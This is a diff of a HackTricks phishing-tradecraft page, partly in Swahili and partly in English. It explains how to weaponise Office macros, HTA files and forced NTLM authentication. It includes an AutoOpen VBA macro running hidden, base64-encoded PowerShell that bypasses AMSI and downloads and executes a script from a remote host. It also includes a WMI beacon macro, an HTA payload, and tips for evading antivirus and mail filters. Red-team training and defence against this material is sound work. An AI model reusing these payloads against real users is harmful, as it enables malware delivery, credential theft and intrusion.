@@ -1,48 +1,53 @@
-# Nyaraka za Udukuzi
+# Phishing Files & Documents
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Nyaraka za Ofisi
+## Office Documents
 
-Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya kutambua muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa kuna kosa lolote wakati wa kutambua muundo wa data, faili inayochambuliwa haitafunguliwa.
+Microsoft Word inafanya uthibitisho wa data za faili kabla ya kufungua faili. Uthibitisho wa data unafanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochambuliwa haitafunguliwa.
 
-Kawaida, faili za Word zinazojumuisha macros hutumia kielezo cha `.docm`. Walakini, inawezekana kubadilisha jina la faili kwa kubadilisha kielezo cha faili na bado kudumisha uwezo wao wa kutekeleza macros.\
-Kwa mfano, faili ya RTF haisaidii macros, kwa kubuni, lakini faili ya DOCM iliyebadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
-Mifumo na taratibu sawa inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).
+Kawaida, faili za Word zinazokuwa na macros hutumia kiambishi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiambishi cha faili na bado kuweka uwezo wao wa kutekeleza macros.\
+Kwa mfano, faili ya RTF haisaidii macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macros.\
+Mifumo na mitambo sawa inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint, nk.).
 
-Unaweza kutumia amri ifuatayo kuangalia ni vifaa vipi vitakavyotekelezwa na baadhi ya programu za Ofisi:
+Unaweza kutumia amri ifuatayo kuangalia ni viambishi gani vitakavyotekelezwa na baadhi ya programu za Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-### Upakiaji wa Picha za Nje
+DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
 
-Nenda: _Chomeka --> Sehemu za Haraka --> Uga_\
-_**Jamii**: Viungo na Marejeleo, **Jina la Uga**: includePicture, na **Jina la Faili au URL**:_ http://\<ip>/chochote
+### External Image Load
+
+Go to: _Insert --> Quick Parts --> Field_\
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
 
 ![](<../../.gitbook/assets/image (155).png>)
 
-### Mlango Nyuma wa Macros
+### Macros Backdoor
 
-Inawezekana kutumia macros kutekeleza nambari isiyojulikana kutoka kwenye hati.
+Ni uwezekano kutumia macros kuendesha msimbo wa kawaida kutoka kwenye hati.
 
-#### Vipengele vya Kiotomatiki
+#### Autoload functions
 
-Kadri wanavyokuwa vya kawaida, ndivyo inavyoweza kugunduliwa na AV.
+Kadri zinavyokuwa za kawaida, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Mifano ya Nambari za Macros
+#### Macros Code Examples
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -72,16 +77,16 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Ondoa metadata kwa mkono
+#### Ondoa metadata kwa mikono
 
-Nenda kwa **Faili > Maelezo > Ukaguzi wa Hati > Ukaguzi wa Hati**, ambayo italeta Mchunguzi wa Hati. Bonyeza **Kagua** kisha **Ondoa Yote** karibu na **Mali za Hati na Taarifa Binafsi**.
+Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.
 
-#### Uzidi wa Hati
+#### Upanuzi wa Doc
 
-Ukapomaliza, chagua **Aina ya Hifadhi** kwenye menyu ya kunjua, badilisha muundo kutoka **`.docx`** hadi **Neno 97-2003 `.doc`**.\
-Fanya hivi kwa sababu huwezi kuhifadhi macro ndani ya `.docx` na kuna **unyanyapaa** kuhusu **uzidi wa macro ya `.docm`** (k.m. ishara ya kidole ina alama kubwa ya `!` na baadhi ya lango la mtandao/barua pepe linazuia kabisa). Hivyo, **uzidi wa zamani wa `.doc` ni muafaka zaidi**.
+Unapomaliza, chagua **Save as type** dropdown, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
+Fanya hivi kwa sababu huwezi **kuhifadhi macro's ndani ya `.docx`** na kuna **stigma** **kuhusu** upanuzi wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya lango la wavuti/barua pepe linaweza kuzizuia kabisa). Hivyo, upanuzi huu wa zamani wa **`.doc`** ni suluhisho bora.
 
-#### Wazalishaji wa Macro Zenye Nia Mbaya
+#### Watengenezaji wa Macros Mbaya
 
 * MacOS
 * [**macphish**](https://github.com/cldrn/macphish)
@@ -89,9 +94,9 @@ Fanya hivi kwa sababu huwezi kuhifadhi macro ndani ya `.docx` na kuna **unyanyap
 
 ## Faili za HTA
 
-HTA ni programu ya Windows ambayo **inachanganya HTML na lugha za maandishi (kama VBScript na JScript)**. Inazalisha kiolesura cha mtumiaji na inatekelezwa kama programu "iliyothibitishwa kabisa", bila vikwazo vya mfano wa usalama wa kivinjari.
+HTA ni programu ya Windows ambayo **inaunganisha HTML na lugha za skripti (kama VBScript na JScript)**. Inaunda kiolesura cha mtumiaji na inatekelezwa kama programu "iliyokubaliwa kikamilifu", bila vizuizi vya mfano wa usalama wa kivinjari.
 
-HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **inasakinishwa** pamoja na **Internet Explorer**, ikifanya **`mshta` kuwa tegemezi kwa IE**. Kwa hivyo, ikiwa imeondolewa, HTAs haitaweza kutekelezwa.
+HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imewekwa** pamoja na **Internet Explorer**, ikifanya **`mshta` kuwa tegemezi la IE**. Hivyo ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -148,9 +153,9 @@ self.close
 ```
 ## Kulazimisha Uthibitisho wa NTLM
 
-Kuna njia kadhaa za **kulazimisha uthibitisho wa NTLM "kijijini"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambayo mtumiaji atafikia (hata HTTP MitM?). Au tuma mhanga **anwani ya faili** ambazo zitafanya **uthibitisho** tu kwa **kufungua folda.**
+Kuna njia kadhaa za **kulazimisha uthibitisho wa NTLM "kijijini"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji atafikia (hata HTTP MitM?). Au tuma mwathirika **anwani ya faili** ambazo zita **anzisha** **uthibitisho** tu kwa **kufungua folda.**
 
-**Angalia mawazo haya na zaidi kwenye kurasa zifuatazo:**
+**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -162,19 +167,22 @@ Kuna njia kadhaa za **kulazimisha uthibitisho wa NTLM "kijijini"**, kwa mfano, u
 
 ### NTLM Relay
 
-Usisahau kwamba huwezi tu kuiba hash au uthibitisho bali pia **kufanya mashambulizi ya NTLM relay**:
+Usisahau kwamba huwezi tu kuiba hash au uthibitisho bali pia **fanya mashambulizi ya NTLM relay**:
 
 * [**Mashambulizi ya NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 * [**AD CS ESC8 (NTLM relay kwa vyeti)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionyeshwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* Pata [**swagi rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
